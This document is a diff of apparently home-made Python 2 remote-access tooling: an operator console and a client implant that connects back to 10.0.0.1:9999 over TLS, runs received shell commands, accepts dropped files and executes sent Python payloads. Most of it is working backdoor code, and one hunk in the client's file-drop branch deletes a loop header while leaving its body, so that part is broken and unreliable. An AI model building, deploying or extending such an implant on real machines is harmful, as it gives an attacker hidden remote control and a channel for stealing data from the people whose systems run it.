@@ -1,11 +1,16 @@
 ### server 
 
-
 from __future__ import print_function
 import socket
 import sys
 import ssl
 import os
+import argparse
+
+parser = argparse.ArgumentParser(description='Specify IP/Host and Port to bind to....')
+parser.add_argument("-H","--host", help="ip/host to connect to", type=str)
+parser.add_argument("-p","--port", help="port to bind to", type=int)
+args=parser.parse_args()
 
 cmd = ""
 
@@ -15,9 +20,10 @@ def create():
         global host
         global port
         global s
-        host = '10.0.0.1'
-        port = 9999
+        host = args.host
+        port = args.port
         s = socket.socket()
+        s = ssl.wrap_socket(s, certfile='ia.crt', keyfile='ia.key', ssl_version=ssl.PROTOCOL_TLSv1)
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
 
@@ -44,7 +50,7 @@ def accept():
 
 def ssend(conn):
     while True:
-        cmd = raw_input(str(os.getcwd() + "lil_red$ "))
+        cmd = raw_input("lil_red$ ")
         args = cmd.split()
         if len(cmd) < 1:
             continue
@@ -57,31 +63,38 @@ def ssend(conn):
             conn.send('drop ' + args[1] + ' ' + str(os.path.getsize(args[1])))
             resp = conn.recv(1024)
             if resp[:5].decode("utf-8") == 'ready':
-                print('ready command received.')
+               # print('ready command received.')
                 f = open(args[1], 'r')
                 data = f.read(1024)
-                print('file contents to send: ' + data)
+               # print('file contents to send: ' + data)
                 while (data):
                     conn.send(data)
                     data = f.read(1024)
                 f.close()
-                print('FILE_TRANSFER_COMPLETE.')
+                print('\n---start client response\n\nFILE_TRANSFER_COMPLETE.\n\n---end client response\n')
             else:
                 print('ready command not received.')
         elif args[0] == 'run':
             conn.send('run ' + str(os.path.getsize(args[1])))
             resp = conn.recv(1024)
             if resp[:5].decode("utf-8") == 'ready':
-                print('ready command received.')
+                #print('ready command received.')
                 f = open(args[1],'r')
                 data = f.read(1024)
-                print('payload to send: ' + data)
+                #print('payload to send: ' + data)
                 while (data):
                     conn.send(data)
                     data = f.read(1024)
                 f.close()
                 conn.send('FILE_TRANSFER_COMPLETE')
                 print('PAYLOAD SENT.')
+                data = ''
+                while True:
+                    client_response = str(conn.recv(1024))
+                    data += client_response
+                    print(data)
+                    if len(client_response) < 1024:
+                        break
         elif len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
             data = ''           
@@ -104,8 +117,8 @@ main()
 
 
 
-### client
 
+### client
 import os
 import socket
 import subprocess
@@ -120,7 +133,7 @@ def create():
         host = '10.0.0.1'
         port = 9999
         s = socket.socket()
-        ssls = s
+        ssls = wrappedSocket = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
 
@@ -145,15 +158,13 @@ def receive():
             # args = data.decode("utf-8")
             args = data.split()
             if data[:2].decode("utf-8") == 'cd':
-                os.chdir(data[3:].decode("utf-8"))
+                try:
+                    os.chdir(data[3:].decode("utf-8"))
+                    ssls.send(os.getcwd())
+                except:
+                    ssls.send("invalid directory")
             elif data[:4].decode("utf-8") == 'drop':
                 f = open(args[1], 'wb')
-                filesize = long(args[2])
-                ssls.send('ready')
-                data = ssls.recv(1024)
-                totalRecv = len(data)
-                f.write(data)
-                while totalRecv < filesize:
                     data = ssls.recv(1024)
                     totalRecv += len(data)
                     f.write(data)
@@ -169,9 +180,9 @@ def receive():
                     data = ssls.recv(1024)
                     totalRecv += len(data)
                     payload += data
-                runproc('python -c ' + payload)
-                b = subprocess.check_output(payload, shell=True)
-                print(b.decode('ascii'))
+                runproc('python - <<EOF ' + '\n' + payload + '\n' + 'EOF')
+                #b = subprocess.check_output(payload, shell=True)
+                #ssls.send(b.decode('ascii'))
             #elif data != 'FILE_TRANSFER_COMPLETE':
             #    runproc(data)
             elif data[:3].decode("utf-8") == 'mem':
@@ -200,7 +211,10 @@ def runproc(data):
     output_bytes = cmd.stdout.read() + cmd.stderr.read()
     output_str = str(output_bytes)
     #ssls.send(str.encode(output_str + str(os.getcwd()) + '> '))
-    ssls.send(str.encode(output_str) + 'job complete.')
+    try:
+        ssls.send('\n---start client response---\n\n' + str.encode(output_str) + '\n---end client response---\n')
+    except:
+        ssls.send('\n---start client response---\n\nencoding error\n\n---end client response---\n')
     print(output_str)
 
 def main():
